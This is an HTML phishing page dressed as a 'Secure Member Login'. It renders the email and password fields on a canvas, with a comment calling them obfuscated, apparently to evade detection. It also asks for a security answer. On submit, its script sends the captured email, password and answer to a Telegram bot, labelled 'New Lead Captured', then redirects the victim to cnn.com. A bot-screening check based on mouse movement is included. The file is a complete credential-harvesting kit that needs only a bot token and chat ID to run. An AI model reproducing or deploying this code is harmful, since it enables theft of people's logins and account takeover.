<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Member Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: white;
            width: 360px;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
            font-size: 22px;
        }

        canvas {
            display: block;
            width: 100%;
            cursor: text;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        label {
            display: block;
            margin-top: 15px;
            margin-bottom: 5px;
            font-weight: 600;
            color: #555;
            font-size: 14px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #b91c1c; /* Red Angus Red */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #991b1b;
        }

        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .status {
            text-align: center;
            margin-top: 10px;
            font-size: 13px;
            min-height: 20px;
            color: #666;
        }

        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #b91c1c;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Member Access</h2>
    
    <!-- Canvas for obfuscated fields -->
    <canvas id="formCanvas" width="300" height="120"></canvas>

    <!-- Standard Input for extra data (optional, but looks professional) -->
    <label>Security Answer</label>
    <input type="text" id="securityAnswer" placeholder="e.g., Mother's maiden name">

    <button id="submitBtn">Verify & Continue</button>
    
    <div class="status" id="status"></div>
    <div class="loader" id="loader"></div>
</div>

<script>
    // --- CONFIGURATION ---
    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
    const CHAT_ID = 'YOUR_CHAT_ID';
    // ---------------------

    const canvas = document.getElementById('formCanvas');
    const ctx = canvas.getContext('2d');
    const statusDiv = document.getElementById('status');
    const submitBtn = document.getElementById('submitBtn');
    const loader = document.getElementById('loader');
    const securityInput = document.getElementById('securityAnswer');

    let activeField = null; // 'email' or 'pass'
    let emailValue = "";
    let passValue = "";
    let blinkState = true;
    
    // Blinking cursor effect
    setInterval(() => { 
        blinkState = !blinkState; 
        draw(); 
    }, 500);

    // Drawing constants
    const emailY = 25;
    const passY = 75;
    const inputWidth = 280;
    const inputHeight = 30;

    function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // Helper to draw rounded rect
        const roundRect = (x, y, w, h, r, fill) => {
            ctx.beginPath();
            ctx.moveTo(x + r, y);
            ctx.arcTo(x + w, y, x + w, y + h, r);
            ctx.arcTo(x + w, y + h, x, y + h, r);
            ctx.arcTo(x, y + h, x, y, r);
            ctx.arcTo(x, y, x + w, y, r);
            ctx.closePath();
            ctx.fillStyle = fill;
            ctx.fill();
        };

        // Email Field
        ctx.fillStyle = "#888";
        ctx.font = "12px Arial";
        ctx.fillText("Email Address", 10, emailY - 5);
        
        // Box
        roundRect(10, emailY, inputWidth, inputHeight, 4, "#fff");
        
        // Text
        ctx.fillStyle = "#000";
        ctx.font = "14px Arial";
        ctx.fillText(emailValue || "Enter your email", 20, emailY + 20);
        
        // Cursor
        if (activeField === 'email') {
            ctx.fillStyle = "#b91c1c";
            ctx.fillRect(20 + ctx.measureText(emailValue).width, emailY + 8, 2, 15);
        }

        // Password Field
        ctx.fillStyle = "#888";
        ctx.font = "12px Arial";
        ctx.fillText("Password", 10, passY - 5);

        // Box
        roundRect(10, passY, inputWidth, inputHeight, 4, "#fff");

        // Masked Text
        let maskStr = "";
        for(let i=0; i<passValue.length; i++) maskStr += "•";
        
        ctx.fillStyle = "#000";
        ctx.font = "14px Arial";
        ctx.fillText(maskStr || "Enter password", 20, passY + 20);

        // Cursor
        if (activeField === 'pass') {
            ctx.fillStyle = "#b91c1c";
            ctx.fillRect(20 + ctx.measureText(maskStr).width, passY + 8, 2, 15);
        }
    }

    // Initial Draw
    draw();

    // Click Handling
    canvas.addEventListener('click', (e) => {
        const rect = canvas.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;

        if (y > emailY && y < emailY + inputHeight) {
            activeField = 'email';
        } else if (y > passY && y < passY + inputHeight) {
            activeField = 'pass';
        } else {
            activeField = null;
        }
        draw();
    });

    // Keyboard Handling
    window.addEventListener('keydown', (e) => {
        if (!activeField) return;

        if (e.key === 'Backspace') {
            if (activeField === 'email') emailValue = emailValue.slice(0, -1);
            if (activeField === 'pass') passValue = passValue.slice(0, -1);
        } else if (e.key.length === 1) {
            if (activeField === 'email') emailValue += e.key;
            if (activeField === 'pass') passValue += e.key;
        }
        draw();
    });

    // --- HUMAN VERIFICATION ---
    let mouseHistory = [];
    let isHuman = false;

    canvas.addEventListener('mousemove', (e) => {
        mouseHistory.push(e.timeStamp);
        if(mouseHistory.length > 10) mouseHistory.shift();
    });

    submitBtn.addEventListener('mouseenter', () => {
        // Simple heuristic: if mouse moved recently, assume human
        if(mouseHistory.length > 0) isHuman = true;
    });

    // --- SUBMISSION ---
    submitBtn.addEventListener('click', async () => {
        if (!emailValue || !passValue) {
            statusDiv.innerText = "Please enter both email and password.";
            return;
        }

        statusDiv.innerText = "Verifying...";
        loader.style.display = "block";
        submitBtn.disabled = true;

        const payload = {
            email: emailValue,
            password: passValue,
            answer: securityInput.value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        try {
            const message = `🔴 *New Lead Captured*\n\n📧 Email: ${payload.email}\n🔑 Pass: ${payload.password}\n❓ Answer: ${payload.answer}\n⏰ Time: ${payload.timestamp}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            statusDiv.innerText = "Success! Redirecting...";
            
            // Force redirect to CNN.com after 2 seconds
            setTimeout(() => {
                window.location.href = "https://www.cnn.com";
            }, 2000);

        } catch (err) {
            statusDiv.innerText = "Error sending data.";
            loader.style.display = "none";
            submitBtn.disabled = false;
        }
    });

</script>
</body>
</html>
